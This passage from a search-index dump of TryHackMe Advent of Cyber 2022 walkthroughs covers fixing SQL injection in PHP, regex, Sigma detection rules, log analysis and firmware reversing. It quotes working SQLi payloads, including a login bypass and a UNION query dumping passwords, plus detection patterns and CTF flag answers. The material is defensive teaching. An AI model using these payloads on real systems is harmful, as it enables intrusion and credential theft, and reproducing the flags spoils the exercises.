<code>THM{Naughty.File.Uploads.Can.Get.You.RCE}</code></p>"},{"location":"walkthroughs/thm/adventofcyber2022/day16/","title":"Day 16 - Secure Coding (SQLi)","text":""},{"location":"walkthroughs/thm/adventofcyber2022/day16/#introduction","title":"Introduction","text":"<p>SQL is the traditional languages used to query databases for information. Any application that relies on a databases needs to be able to create SQL syntax on the fly and send them to the database engine to retrieve the required information.</p> <p>The application used in today's challenge uses <code>MySQL</code> as a backend database. <code>MySQL</code> stores information in structures called <code>tables</code>. Each <code>table</code> consists of <code>columns</code> (field of data) and <code>rows</code>.</p> <p>To query information from a database, the <code>SELECT</code> statement can be used in conjunction with the <code>columns</code> and <code>rows</code> we want to retrieve from a specific table. For example:</p> <pre><code>SELECT * FROM toys;\n</code></pre> <p>Here we are selecting all columns (indicated by *) from the table named toys. To retrieve specific columns, we can use a comma-separated list of columns.</p> <pre><code>SELECT name, quantity FROM toys;\n</code></pre> <p>To retrieve a specific row, we can append the query with a <code>WHERE</code> statement followed by our condition.</p> <pre><code>SELECT id FROM users WHERE id = 1;\n</code></pre>"},{"location":"walkthroughs/thm/adventofcyber2022/day16/#slq-injection-sqli","title":"SLQ Injection (SQLi)","text":"<p>Vulnerabilities SQLi can arise when a web-application takes untrusted input from a user and concatenates it to an SQL question without sanitizing the input. Using SQLi, threat actors can attempt to get a server to run complex SQL queries and potentially dump any data on any table they want.</p>"},{"location":"walkthroughs/thm/adventofcyber2022/day16/#fixing-sqli-by-data-type-validation","title":"Fixing SQLi by Data Type Validation","text":"<p>One of the easiest and most effective ways to prevent SQL injections is to ensure that any data that the user can manipulate that you are concatenating as part of an SQL statement is actually from the type you expect.</p> <p>Let's look at an example of sending SQL queries from PHP.</p> <pre><code>$query=\"select * from users where id=\".$_GET['id'];\n$elves_rs=mysqli_query($db,$query);\n</code></pre> <p>The above code takes the <code>id</code> parameter from the URL and concatenates it to an SQL query. For example, if the expected data type for <code>id</code> is an integer then any user input in the <code>id</code> parameter should be converted to an integer. In PHP, <code>intval()</code> function can be used to return the integer value of a string.</p> <pre><code>$query=\"select * from users where id=\".intval($_GET['id']);\n$elves_rs=mysqli_query($db,$query);\n</code></pre> <p>With the above code modification, if an attacker sends an SQLi payload via the <code>id</code> parameter, the code will convert the input to an integer before concatenating it as part of the SQL statement. Any malformed input would simply return a zero.</p>"},{"location":"walkthroughs/thm/adventofcyber2022/day16/#fixing-sqli-using-prepared-statements","title":"Fixing SQLi Using Prepared Statements","text":"<p>Prepared statements need to be used if the web-application needs to allow a user to pass arbitrary strings through a parameter (ie. search field).</p> <p>An example of a vulnerable SQL search query in PHP is presented below:</p> <pre><code>$query=\"select * from toys where name like '%\".$_GET['q'].\"%' or description like '%\".$_GET['q'].\"%'\";\n$toys_rs=mysqli_query($db,$query);\n</code></pre> <p>Here the <code>q</code> parameter gets concatenated twice into the same SQL sequence. The problem with building SQL queries in PHP is that database has no other option but to trust what is being given. If an attacker somehow injects SQL, PHP will blindly concatenate the injected payload into the query string and the database will execute it. The safest way to remedy this problem is to use prepared statements.</p> <p>Prepared statements allow separation of the syntax of the SQL query from the actual parameters used on the <code>WHERE</code> clause. Instead of building a single string by concatenation, you will first describe the structure of the SQL query and use placeholders to indicate the position of the query's parameters. You will then bind the parameters to the prepared statement in a separate function call. Essentially, instead of providing a single SQL query string, we will send dynamic parameters separately from the query itself, allowing the database to piece together securely without depending on PHP.</p> <p>This can be done by first modifying the initial query by replacing any parameter with a place holder indicated by <code>?</code>. This tells the database we want to run a query that takes two parameters as inputs. The query will then be passed to the <code>mysqli_prepare()</code> function instead of the usual <code>mysqli_query()</code>. <code>mysqli_prepare()</code> will not run the query but will indicate to the database to prepare the query with the given syntax. This function returns a prepared statement.</p> <pre><code>$query=\"select * from toys where name like ? or description like ?\";\n$stmt = mysqli_prepare($db, $query);\n</code></pre> <p>To execute the query, MySQL needs to know the value to put on each placeholder we defined before. <code>mysqli_stmt_bind_param()</code> function can be used to attach variables to each place holder. The function requires you to send the following function parameters:</p> <ul> <li>The first parameter should be a reference to the prepared statement to which to bind the variables.</li> <li>The second parameter is a string composed of one letter per place holder to be bound; where letters indicate each variable's data type. In our example, since we are passing two strings, we use <code>\"ss\"</code> in the second parameter. You can use <code>\"i\"</code> for integers or <code>\"d\"</code> for floats.</li> <li>Lastly, you need to pass the variables themselves. You must pass as many variables as placeholders defined by <code>?</code> in the query.</li> </ul> <p><pre><code>$q = \"%\".$_GET['q'].\"%\";\nmysqli_stmt_bind_param($stmt, 'ss', $q, $q);\n</code></pre> Once the statement is created and parameters bound, the prepared statement can be executed using <code>mysqli_stmt_execute()</code> which receives the statement <code>$stmt</code> as its only parameter.</p> <p><pre><code>mysqli_stmt_execute($stmt);\n</code></pre> When the statement has been executed, we can retrieve the corresponding result set using the <code>mysqli_stmt_get_result()</code>. We can assign the result set to the <code>$toys_rs</code> variable as in the original code.</p> <p><pre><code>$toys_rs=mysqli_stmt_get_result($stmt);\n</code></pre> Putting the above together results in the following code:</p> <pre><code>$q = \"%\".$_GET['q'].\"%\";\n$query=\"select * from toys where name like ? or description like ?\";\n$stmt = mysqli_prepare($db, $query);\nmysqli_stmt_bind_param($stmt, 'ss', $q, $q);\nmysqli_stmt_execute($stmt);\n$toys_rs=mysqli_stmt_get_result($stmt);\n</code></pre>"},{"location":"walkthroughs/thm/adventofcyber2022/day16/#ctf-questions","title":"CTF Questions","text":"<p>Ask the elves to run the check on the webapp. Elf Exploit indicates that by injecting <code>http://Machine_IP/webapp/elf.php?id=1 or 1=1 limit 4,1</code> He was able to was able to manipulate the DB into returning a specific elf record. Open <code>elf.php</code> and modify at the PHP code as follows to fix the vulnerability.</p> <p><pre><code>&lt;?php\n    include \"connection.php\";\n\n    #$query=\"select * from users where id=\".$_GET['id'];\n  $query=\"select * from users where id=\".intval($_GET['id']); // Fixed vulnerability\n    $elves_rs=mysqli_query($db,$query);\n\n    if(!$elves_rs)\n    {\n        echo \"&lt;font color=red size=10&gt;Error: Invalid SQL Query&lt;/font&gt;\";\n        die($query);\n    }\n\n    // Get the first result. There should be a single elf here.\n    $elf=mysqli_fetch_assoc($elves_rs);\n\n    //Now get the toys associated to this elf\n    $query=\"select * from toys where creator_id=\".intval($_GET['id']); //Fixed vulnerability\n    $toys_rs=mysqli_query($db,$query);\n\n    if(!$toys_rs)\n    {\n        echo \"&lt;font color=red size=10&gt;Error: Invalid SQL Query&lt;/font&gt;\";\n        die($query);\n    }\n\n?&gt;\n</code></pre> Asking the Elves to run the check again shows no more vulnerabilities in <code>elf.php</code> and reveals the first flag <code>THM{McCode, Elf McCode}</code>.</p> <p>Elf Exploit however reveals that the file <code>search-toys.php</code> is exploitable using <code>http://Machine_IP/webapp/search-toys.php?q=99999' union all select null,2,username,password,null,null,null from users -- x</code>. Open the file and modify the PHP code as follows to fix the vulnerability to get the second flag <code>THM{KodeNRoll}</code>.</p> <p><pre><code>&lt;?php\ninclude \"connection.php\";\n\n//The following lines of code fix the vulnerability\n#$query=\"select * from toys where name like '%\".$_GET['q'].\"%' or description like '%\".$_GET['q'].\"%'\";\n$q=\"%\".$_GET['q'].\"%\";\n$query=\"select * from toys where name like ? or description like ?\";\n$stmt=mysqli_prepare($db,$query);\nmysqli_stmt_bind_param($stmt,'ss',$q,$q);\nmysqli_stmt_execute($stmt);\n$toys_rs=mysqli_stmt_get_result($stmt);\n#$toys_rs=mysqli_query($db,$query);\n\nif(!$toys_rs)\n{\n    echo \"&lt;font color=red size=10&gt;Error: Invalid SQL Query&lt;/font&gt;\";\n    die($query);\n}\n\n?&gt;\n</code></pre> Elf Exploit states that he  can inject SQL to force the DB into returning Evan Nowell as one of the receivers of an Animal Farm, even if Evan didn't get enough Goodboy Score to get that present. You can access here to see what I mean: <code>http://Machine_IP/webapp/toy.php?id=1 or 1=1 limit 4,1</code>. If you access the regular link for the Animal Farm, you'll see that Evan isn't one of the receivers.</p> <p>This vulnerability can be fixed by modifying the PHP code in <code>toy.php</code> as follows to get the third flag <code>THM{Are we secure yet?}</code>.</p> <p><pre><code>&lt;?php\n    include \"connection.php\";\n\n    #$query=\"select * from toys where id=\".$_GET['id'];\n    $query=\"select * from toys where id=\".intval($_GET['id']); //Fixed vulnerability\n    $toys_rs=mysqli_query($db,$query);\n\n    if(!$toys_rs)\n    {\n        echo \"&lt;font color=red size=10&gt;Error: Invalid SQL Query&lt;/font&gt;\";\n        die($query);\n    }\n\n    // Get the first result. There should be a single elf here.\n    $toy=mysqli_fetch_assoc($toys_rs);\n\n    //query info on the creator elf\n    $query=\"select * from users where id=\".$toy['creator_id'];\n    $elves_rs=mysqli_query($db,$query);\n\n    if(!$elves_rs)\n    {\n        echo \"&lt;font color=red size=10&gt;Error: Invalid SQL Query&lt;/font&gt;\";\n        die($query);\n    }\n\n    // Get the first result. There should be a single elf here.\n    $elf=mysqli_fetch_assoc($elves_rs);\n\n    //query info on planned deliveries\n    #$query=\"select * from kids where assigned_toy_id=\".$_GET['id'];\n    $query=\"select * from kids where assigned_toy_id=\".intval($_GET['id']); //Fixed vulnerability\n    $kids_rs=mysqli_query($db,$query);\n\n    if(!$kids_rs)\n    {\n        echo \"&lt;font color=red size=10&gt;Error: Invalid SQL Query&lt;/font&gt;\";\n        die($query);\n    }\n?&gt;\n</code></pre> Elf Exploit reports that he can bypass the login screen at: <code>http://Machine_IP/webapp/login.php</code> with SQL injection in the username. If you want to try it, just use any password with this as your username: <code>' OR 1=1-- x</code>. Let's modify the <code>$_POST</code> parameters to fix the vulnerability and get the fourth flag <code>THM{SQLi_who???}</code>. The vulnerability exists in both the <code>username</code> and <code>password</code> field so we need to account for both in the fix.</p> <pre><code>&lt;?php\nrequire_once(\"connection.php\");\nsession_start();\n\nif(isset($_POST['username']) &amp;&amp; isset($_POST['password'])){\n    $username=$_POST['username'];\n    $password=$_POST['password'];\n\n  //The following lines of code fix the vulnerability\n  #$query=\"select * from users where username='\".$username.\"' and password='\".$password.\"'\";\n    $query=\"select * from users where username=? and password=?\";\n    $stmt=mysqli_prepare($db,$query);\n    mysqli_stmt_bind_param($stmt,'ss', $username, $password);\n    mysqli_stmt_execute($stmt);\n    $users_rs=mysqli_stmt_get_result($stmt);\n    #$users_rs=mysqli_query($db, $query);\n\n  if(mysqli_num_rows($users_rs)&gt;0)\n    {\n        $_SESSION['username']=$username;\n        echo \"&lt;script&gt;window.location='admin.php';&lt;/script&gt;\";\n    }\n    else\n    {\n        $message=\"Incorrect username/password found!\";\n        echo \"&lt;script type='text/javascript'&gt;alert('$message');&lt;/script&gt;\";\n    }\n}\n?&gt;\n</code></pre>"},{"location":"walkthroughs/thm/adventofcyber2022/day17/","title":"Day 17 - Secure Coding (Regular Expressions)","text":""},{"location":"walkthroughs/thm/adventofcyber2022/day17/#regex-fundamentals","title":"Regex Fundamentals","text":"<ul> <li>The <code>[ ]</code> indicate that you're trying to match one character within the set of characters inside of them. For example, if we're trying to match any vowel of the English alphabet, we construct our regex as follows: <code>[aeiou]</code>. The order of the characters doesn't matter, and it will match the same.</li> <li>You can also mix and match sets of characters within the bracket. <code>[a-zA-Z]</code> means you want to match any character from the English alphabet regardless of case, while <code>[a-z0-9]</code> means you want to match any lowercase alphanumeric character.</li> <li>The wildcard operator is denoted by <code>.</code>.</li> <li>The <code>*</code> operator is used if you don't care if the preceding token matches anything or not.</li> <li>The <code>+</code> operator is used if you want to make sure the preceding token matches at least once. For example, to match a string that is alphanumeric and case insensitive, our pattern would be <code>[a-zA-Z0-9]+</code>. The <code>+</code> operator means that we want to match a string . We don't care how long it is, as long as it's composed of letters and numbers regardless of their case.</li> <li>The <code>^</code> and <code>$</code> operators are called anchors and denote the start and end of the string we want to match, respectively. If we want to ensure that the start of a string is composed of only letters, adding the caret operator is required. For example, if we want to ensure that the first part of the string is composed of letters and we want it to match regardless if there are numbers thereafter, the expression would be <code>^[a-zA-Z]+[0-9]*$</code>.</li> <li>The <code>{min,max}</code> operator specifies the number of characters you want to match. For example, if we want to match just lowercase letters that are in between 3 and 9 characters in length, our pattern would be <code>^[a-z]{3,9}$</code>. If we want a string that starts with 3 letters followed by any 3 characters, our pattern would be <code>^[a-zA-Z]{3}.{3}$</code>.</li> <li>Grouping is denoted by the <code>( )</code>. Grouping is typically done to manage the matching of specific parts of the regex better.</li> <li>Escaping is denoted by <code>\\</code>. Escaping is used so we can match strings that contain regex operators.</li> <li>The <code>?</code> operator denotes that the preceding token is optional.</li> </ul> <p>Following is a table with summarizes the information presented above.</p> Operator Function [ ] Character Set: matches any single character/range of characters inside . Wildcard: matches any character * Star/Astrix Quantifier: matches the preceding token zero or more times + Plus Quantifier: matches the preceding token one or more times {min,max} Curly Brace Quantifier: specifies how many times the preceding token can be repeated ( ) Grouping: groups a specific part of the regex for better management |Escape: escapes the regex operator so it can be matched ? Optional: specifies that the preceding token is optional ^ Anchor Beginning: specifies that the consequent token is at the beginning of the string $ Anchor Ending: specifies that hte preceding token is at the end of the string"},{"location":"walkthroughs/thm/adventofcyber2022/day17/#ctf-questions","title":"CTF Questions","text":"<ol> <li>Use <code>egrep '^[a-zA-Z0-9]{6,12}$' strings</code></li> <li>Use <code>egrep '^[a-zA-Z]+[0-9]{1}+$' strings</code></li> <li>Use <code>egrep '^.+@.+\\.com$' strings</code></li> <li>Simply count the unique domains listed in <code>3</code></li> <li>Use <code>egrep '^lewisham44@.+\\.com$' strings</code></li> <li>Use <code>egrep '^maxximax@.+\\.com$' strings</code></li> <li>Use <code>egrep '^.+@hotmail\\.com$' strings</code></li> <li>Use <code>egrep '^http(s)?(://)(www\\.)?.+\\..$' strings</code></li> <li>Use <code>egrep '^https://(www\\.)?.+\\..$' strings</code></li> </ol>"},{"location":"walkthroughs/thm/adventofcyber2022/day18/","title":"Day 18 - Sigma","text":""},{"location":"walkthroughs/thm/adventofcyber2022/day18/#introduction","title":"Introduction","text":"<p>Threat detection involves proactively pursuing and analysing abnormal activity within an ecosystem to identify malicious signs of compromise or intrusion within a network.</p>"},{"location":"walkthroughs/thm/adventofcyber2022/day18/#chopping-logs-with-sigma-rules","title":"Chopping Logs with Sigma Rules","text":"<p><code>Sigma</code> is an open-source generic signature language to describe log events in a structured format. The format includes using markup language called <code>YAML</code> (a designed syntax that allows for quick sharing of detection methods by security analysts). Common factors to note about YAML fields include the following:</p> <ul> <li>YAML is case-sensitive.</li> <li>Files should have the <code>.yml</code> extension.</li> <li><code>Spaces</code> are sued for indentation and not tabs.</li> <li>COmments are attributed using the <code>#</code> operator.</li> <li>Key-value pairs are denoted using the <code>:</code> operator.</li> <li>Array elements are denoted using <code>-</code> operator.</li> </ul> <p>Log files are usually collected and stored in a database or a <code>Security Information and Event Management (SIEM)</code> solution for further analysis. Sigma is vendor-agnostic; therefore, the rules can be converted to a format that fits the target SIEM.</p> <p>Sigma was developed to satisfy the following scenarios:</p> <ul> <li>To make detection methods and signatures shareable alongside IOCs and Yara rules.</li> <li>To write SIEM searches that avoid vendor lock-in.</li> <li>To share signatures with threat intelligence communities.</li> <li>To write custom detection rules for malicious behaviour based on specific conditions.</li> </ul>"},{"location":"walkthroughs/thm/adventofcyber2022/day18/#sigma-rule-syntax","title":"Sigma Rule Syntax","text":"<p>Sigma rules are guided by a given order of required/optional fields and values that create the structure for mapping needed queries.</p> <p>Following are examples of and tips on some fields in Sigma ruleset:</p> <ul> <li>Title: Names the rule based on what it is supposed to detect.</li> <li>ID: A globally unique identifier that the developers of Sigma mainly use to maintain the order of identification for the rules submitted to the public repository, found in UUID format.</li> <li>Status: Describes the stage in which the rule maturity is at while in use. There are five declared statuses that you can use:<ul> <li>Stable: The rule may be used in production environments and dashboards.</li> <li>Test: Trials are being done to the rule and could require fine-tuning.</li> <li>Experimental: The rule is very generic and is being tested. It could lead to false results, be noisy, and identify exciting events.</li> <li>Deprecated: The rule has been replaced and would no longer yield accurate results.</li> <li>Unsupported: The rule is not usable in its current state (unique correlation log, homemade fields).</li> </ul> </li> <li>Description: Provides more context about the rule and its intended purpose. Here, you can be as detailed as possible to provide information about the detected activity.</li> </ul> <pre><code>title: Suspicious Local Account Creation\nid: 0f06a3a5-6a09-413f-8743-e6cf35561297 \nstatus: experimental\ndescription: Detects the creation of a local user account on a computer.\n</code></pre> <ul> <li>Logsource: Describes the log data to be used for the detection. It consists of other optional attributes:<ul> <li>Product: Selects all log outputs of a certain product. Examples are Windows, Apache</li> <li>Category: Selects the log files written by the selected product. Examples are firewalls, web, and antivirus.</li> <li>Service: Selects only a subset of the logs. Examples are sshd on Linux or Security on Windows.</li> <li>Definition: Describes the log source and its applied configurations.</li> </ul> </li> </ul> <pre><code>logsource:\n  product: windows\n  service: security\n</code></pre> <ul> <li>Detection:  A required field in the detection rule describes the parameters of the malicious activity we need an alert for. The parameters are divided into two main parts:<ul> <li>The search identifiers are the fields and values the detection should search for. The search identifiers can be enhanced using different modifiers appended to the field name with the pipe character <code>|</code>. The main type of modifiers are known as Transformation modifiers and comprise the values: <code>contains, endswith, startswith, and all</code>. </li> <li>The condition expression - sets the action to be taken on the detection, such as selection or filtering. The critical thing to look out for account creation on Windows is the Event ID associated with user accounts. In this case, Event ID: 4720 was provided for us on the IOC list, which will be our search identifier.</li> </ul> </li> </ul> <pre><code>detection:\n  selection:\n    EventID:  # This shows the search identifier value\n      - 4720    # This shows the search's list value\n  condition: selection\n</code></pre> <pre><code>detection:\n  selection:\n    Image|endswith:\n      - '\\svchost.exe'\n    CommandLine|contains|all: \n      - bash.exe\n      - '-c '   \n  condition: selection\n</code></pre> <ul> <li>FalsePositives: A list of known false positives that may occur based on log data.</li> </ul> <pre><code>falsepositives: \n    - unknown\nlevel: low\ntags:\n   - attack.persistence # Points to the MITRE Tactic\n   - attack.T1136.001 # Points to the MITRE Technique\n</code></pre> <ul> <li>Level: Describes the severity with which the security team should take the activity under the written rule. The attribute comprises five levels: Informational -&gt; Low -&gt; Medium -&gt; High -&gt; Critical</li> <li>Tags: Adds information that can be used to categorize the rule. Common tags are associated with tactics and techniques from the MITRE ATT&amp;CK framework. </li> </ul> <p>Tip</p> <p>Sigma developers have a defined list of predefined tags.</p>"},{"location":"walkthroughs/thm/adventofcyber2022/day18/#ctf-questions","title":"CTF Questions","text":""},{"location":"walkthroughs/thm/adventofcyber2022/day18/#flag-1","title":"Flag 1","text":"<pre><code>title: Suspicious Account Creation\nid: 01 # UUID\nstatus: experimental\ndescription: Detects local account creation\nauthor:\ndate:\nmodified:\n\nlogsource: # Outlines target source of the logs based on operating system, service being run, category of logs.\n  product: windows # windows, linux, macos.\n  service: security # sshd for Linux, Security for Windows, applocker, sysmon.\n  category: # firewall, web, antivirus, process_creation, network_connection, file_access.\ndetection:\n  selection:\n    EventID:\n      - 4720\n\n  condition: selection # Action to be taken. Can use condition operators such as OR, AND, NOT when using multiple search identifiers.\n\nfalsepositives: # Legitimate services or use.\n  - unknown\n\nlevel: low # informational, low, medium, high or critical.\n\ntags: # Associated TTPs from MITRE ATT&amp;CK\n  - attack.persistence # MITRE Tactic\n  - attack.T1136.001 # MITRE Technique \n</code></pre>"},{"location":"walkthroughs/thm/adventofcyber2022/day18/#flag-2","title":"Flag 2","text":"<pre><code>title: Software Discovery\nid: 02 # UUID\nstatus: experimental # experimental, test, stable, deprecated, unsupported.\ndescription: Detect software\nauthor:\ndate:\nmodified:\n\nlogsource: # Outlines target source of the logs based on operating system, service being run, category of logs.\n  product: windows # windows, linux, macos.\n  service: sysmon # sshd for Linux, Security for Windows, applocker, sysmon.\n  category: process_creation # firewall, web, antivirus, process_creation, network_connection, file_access.\ndetection:\n  selection:\n    EventID: 1\n    Image|endswith: reg.exe\n    CommandLine|contains|all: \n    - reg\n    - query\n    - /v\n    - svcVersion\n\n  condition: selection # Action to be taken. Can use condition operators such as OR, AND, NOT when using multiple search identifiers.\n\nfalsepositives: unknown # Legitimate services or use.\n\nlevel: low # informational, low, medium, high or critical.\n\ntags: # Associated TTPs from MITRE ATT&amp;CK\n  - {attack.tactic} # MITRE Tactic\n  - {attack.technique} # MITRE Technique \n</code></pre>"},{"location":"walkthroughs/thm/adventofcyber2022/day18/#flag-3","title":"Flag 3","text":"<pre><code>title: Scheduled Task Creation\nid: 03 # UUID\nstatus: experimental # experimental, test, stable, deprecated, unsupported.\ndescription: Detect scheduled task creation\nauthor:\ndate:\nmodified:\n\nlogsource: # Outlines target source of the logs based on operating system, service being run, category of logs.\n  product: windows # windows, linux, macos.\n  service: sysmon # sshd for Linux, Security for Windows, applocker, sysmon.\n  category: process_creation # firewall, web, antivirus, process_creation, network_connection, file_access.\ndetection:\n  selection:\n    EventID: 1\n    Image|endswith: schtasks.exe\n    ParentImage|endswith: cmd.exe\n    CommandLine|contains|all:\n    - schtasks\n    - /create\n\n  condition: selection # Action to be taken. Can use condition operators such as OR, AND, NOT when using multiple search identifiers.\n\nfalsepositives: # Legitimate services or use.\n\nlevel:  # informational, low, medium, high or critical.\n\ntags: # Associated TTPs from MITRE ATT&amp;CK\n  - {attack.tactic} # MITRE Tactic\n  - {attack.technique} # MITRE Technique \n</code></pre>"},{"location":"walkthroughs/thm/adventofcyber2022/day19/","title":"Day 19 - Hardware Hacking","text":"<p>No write-up added. Recommend reading the material posted for the task.</p>"},{"location":"walkthroughs/thm/adventofcyber2022/day2/","title":"Day 02 - Log Analysis","text":""},{"location":"walkthroughs/thm/adventofcyber2022/day2/#introduction","title":"Introduction","text":"<p>Log files content vary however a useful log will contain at least the following: 1. A timestamp of when an event occurred. 2. The name of the service that is generating of the log file.  3. The actual event the service logs.</p>"},{"location":"walkthroughs/thm/adventofcyber2022/day2/#common-locations-of-log-files","title":"Common Locations of Log Files","text":""},{"location":"walkthroughs/thm/adventofcyber2022/day2/#windows","title":"Windows","text":"<p>The windows operating system features an in-built application (Event Viewer) which features historical records of events. Events are typically categorized as follows:</p> Category Description Application Contains all events related to applications on the system (ie. when a service or application are started or stopped and why) Security Contains all events related to system's security (ie. when a user logins into a system or a failed login attempt) Setup Contains all events related to system's maintenance (ie. Windows update logs) System Contains all events related to the system itself and any changes which may have occurred (ie. external device plugged-in/removed)"},{"location":"walkthroughs/thm/adventofcyber2022/day2/#linux-ubuntudebian","title":"Linux (Ubuntu/Debian)","text":"<p>All log files related to Ubuntu or Debian systems are stored under <code>/var/log</code>.</p> <p>Some important log files are presented below:</p> Category Description File Authentication Contains all attempted and successful local or remote authentications auth.log Package Management Contains all events related to package management on the system (ie. package installation/removal/updates) dpkg.log Syslog Contains all events related to things happening in the system's background (ie. crontabs executing, services starting/stopping) syslog Kernel Contains all events related to kernel on the system (ie. changes to the kernel, output form devices such as network equipment or USB devices) kern.log"},{"location":"walkthroughs/thm/adventofcyber2022/day2/#ctf-questions","title":"CTF Questions","text":"<p>The name of the important list that the attacker stole from Santa was discovered using:</p> <pre><code>elfmcblue@day-2-log-analysis:~$ grep -i \"wget\" webserver.log \n10.10.249.191 - - [18/Nov/2022:12:28:18 +0000] \"GET /ipwget HTTP/1.1\" 404 437 \"-\"\n10.10.249.191 - - [18/Nov/2022:12:28:18 +0000] \"GET /wget HTTP/1.1\" 404 437 \"-\" \"\n10.10.249.191 - - [18/Nov/2022:12:34:39 +0000] \"GET /santaslist.txt HTTP/1.1\" 200\n10.10.249.191 - - [18/Nov/2022:12:35:18 +0000] \"GET /gwget HTTP/1.1\" 404 437 \"-\" \n10.10.249.191 - - [18/Nov/2022:12:35:19 +0000] \"GET /wget HTTP/1.1\" 404 437 \"-\" \"\n</code></pre> <p>The final flag was discovered using:</p> <pre><code>elfmcblue@day-2-log-analysis:~$ grep -r \"THM{\" .\n./SSHD.log:THM{STOLENSANTASLIST}\n</code></pre>"},{"location":"walkthroughs/thm/adventofcyber2022/day20/","title":"Day 20 - Firmware Reverse Engineering","text":""},{"location":"walkthroughs/thm/adventofcyber2022/day20/#introduction","title":"Introduction","text":"<p>Firmware reverse engineering involves extracting the original code from the firmware binary file and verifying that the code does not carry out malicious or unintended functionality.</p> <p>Following is a basic process followed when doing firmware reverse engineering:</p> <ol> <li>Obtain the firmware from the vendor's website or extract it from the device.</li> <li>The obtained/extracted firmware (typically a binary file) is first analyzed to figure out its type (bare metal or OS based).</li> <li>Verify if the firmware is either encrypted or packed. Encrypted firmware is challenging to analyze as it usually needs a tricky workaround, such as reversing the previous non-encrypted releases of the firmware or performing hardware attacks like Side Channel Attacks (SCA) to fetch the encryption keys.</li> <li>Once the encrypted firmware is decrypted, different techniques and tools are used to perform reverse engineering based on type.</li> </ol>"},{"location":"walkthroughs/thm/adventofcyber2022/day20/#types-of-firmware-analysis","title":"Types of Firmware Analysis","text":"<p>Firmware analysis is typically conducted using two techniques, <code>Static Analysis</code> and <code>Dynamic Analysis</code>.</p>"},{"location":"walkthroughs/thm/adventofcyber2022/day20/#static-analysis","title":"Static Analysis","text":"<p>Static analysis involves examining the binary file contents, performing its reverse engineering, and reading the assembly instructions to understand the functionality. The following tools are commonly employed when conducting static analysis on firmwares:</p> <ul> <li>Binwalk: A firmware extraction tool that extracts code snippets inside any binary by searching for signatures against many standard binary file formats like <code>zip, tar, exe, ELF</code>. The common objective of using this tool is to extract a file system like <code>Squashfs, yaffs2, Cramfs, ext*fs, jffs2</code>, which is embeded in the firmware binary. The file system contains all the application code that will be running on the device.</li> <li>Firmware ModKit (FMK): FMK is widely used for firmware reverse engineering. It extracts the firmware using <code>binwalk</code> and outputs a directory with the firmware file system. Once the code is extracted, the desired files can be modified and the binary repacked with a single command.</li> <li>Firmwalker: Searches through extracted firmware file system for unique strings and directories like <code>etc/shadow</code>, <code>etc/passwd</code>, <code>etc/ssl</code>, keywords like <code>admin, root, password</code>, and vulnerable binaries like <code>ssh, telnet, netcat</code>.</li> </ul>"},{"location":"walkthroughs/thm/adventofcyber2022/day20/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>Dynamic analysis involves running the firmware on an actual hardware and observing its behaviour through emulation and hardware/software based debugging. One of the significant advantages of dynamic analysis is to analyze unintended network communication for identifying data exfiltration. The following tools are commonly used for dynamic analysis:</p> <ul> <li>Qemu: Qemu is a free and open-source emulator which enables working on cross-platform environments. The tool provides various ways to emulate binary firmware for different architectures like <code>Advanced RISC Machines (ARM)</code>, <code>Microprocessors without Interlocked Pipelined Stages (MIPS)</code>, and others on the host system. Qemu can help in full-system emulation or a single binary emulation of <code>Executable and Linkable Format (ELF)</code> files.</li> <li>Gnu DeBugger (GDB): GDB is a dynamic debugging tool for emulating a binary and inspecting its memory and registers. GDB also supports remote debugging, commonly used during firmware reversing when the target binary runs on a separate host and reversing is carried out from a different host.</li> </ul>"},{"location":"walkthroughs/thm/adventofcyber2022/day20/#ctf-questions","title":"CTF Questions","text":""},{"location":"walkthroughs/thm/adventofcyber2022/day20/#step-1-verify-encryption","title":"Step 1 - Verify Encryption","text":"<p>Let's use <code>binwalk</code> to verify whether the binary file is encrypted using a technique known as <code>file entropy analysis</code>.</p> <pre><code>test@ip-10-10-204-137:~$ ls\nbin  bin-unsigned  firmware-mod-kit\ntest@ip-10-10-204-137:~$ cd bin\ntest@ip-10-10-204-137:~/bin$ ls\nfirmwarev2.2-encrypted.gpg\ntest@ip-10-10-204-137:~/bin$ binwalk -E -N firmwarev2.2-encrypted.gpg \n\nDECIMAL       HEXADECIMAL     ENTROPY\n--------------------------------------------------------------------------------\n0             0x0             Rising entropy edge (0.989903)\n</code></pre> <p>In the above output, the <code>rising entropy</code> edge means that the file is probably encrypted and has increased randomness.</p>"},{"location":"walkthroughs/thm/adventofcyber2022/day20/#step-2-extracting-unencrypted-older-version","title":"Step 2 - Extracting Unencrypted Older Version","text":"<p>Let's extract the firmware from the older unencrypted binary using <code>FMK</code>.</p> <pre><code>test@ip-10-10-204-137:~/bin-unsigned$ ls\nfirmwarev1.0-unsigned\ntest@ip-10-10-204-137:~/bin-unsigned$ extract-firmware.sh firmwarev1.0-unsigned \nFirmware Mod Kit (extract) 0.99, (c)2011-2013 Craig Heffner, Jeremy Collake\n\nScanning firmware...\n\nScan Time:     2022-12-20 17:35:07\nTarget File:   /home/test/bin-unsigned/firmwarev1.0-unsigned\nMD5 Checksum:  b141dc2678be3a20d4214b93354fedc0\nSignatures:    344\n\nDECIMAL       HEXADECIMAL     DESCRIPTION\n--------------------------------------------------------------------------------\n0             0x0             TP-Link firmware header, firmware version: 0.-15360.3, image ver\nsion: \"\", product ID: 0x0, product version: 138412034, kernel load address: 0x0, kernel entry \npoint: 0x80002000, kernel offset: 4063744, kernel length: 512, rootfs offset: 849104, rootfs l\nength: 1048576, bootloader offset: 2883584, bootloader length: 0\n13344         0x3420          U-Boot version string, \"U-Boot 1.1.4 (Apr  6 2016 - 11:12:23)\"\n13392         0x3450          CRC32 polynomial table, big endian\n14704         0x3970          uImage header, header size: 64 bytes, header CRC: 0x5A946B00, cr\neated: 2016-04-06 03:12:24, image size: 35920 bytes, Data Address: 0x80010000, Entry Point: 0x\n80010000, data CRC: 0x510235FE, OS: Linux, CPU: MIPS, image type: Firmware Image, compression \ntype: lzma, image name: \"u-boot image\"\n14768         0x39B0          LZMA compressed data, properties: 0x5D, dictionary size: 3355443\n2 bytes, uncompressed size: 93944 bytes\n131584        0x20200         TP-Link firmware header, firmware version: 0.0.3, image version:\n \"\", product ID: 0x0, product version: 138412034, kernel load address: 0x0, kernel entry point\n: 0x80002000, kernel offset: 3932160, kernel length: 512, rootfs offset: 849104, rootfs length\n: 1048576, bootloader offset: 2883584, bootloader length: 0\n132096        0x20400         LZMA compressed data, properties: 0x5D, dictionary size: 3355443\n2 bytes, uncompressed size: 2494744 bytes\n1180160       0x120200        Squashfs filesystem, little endian, version 4.0, compression:lzm\na, size: 2812026 bytes, 600 inodes, blocksize: 131072 bytes, created: 2022-11-17 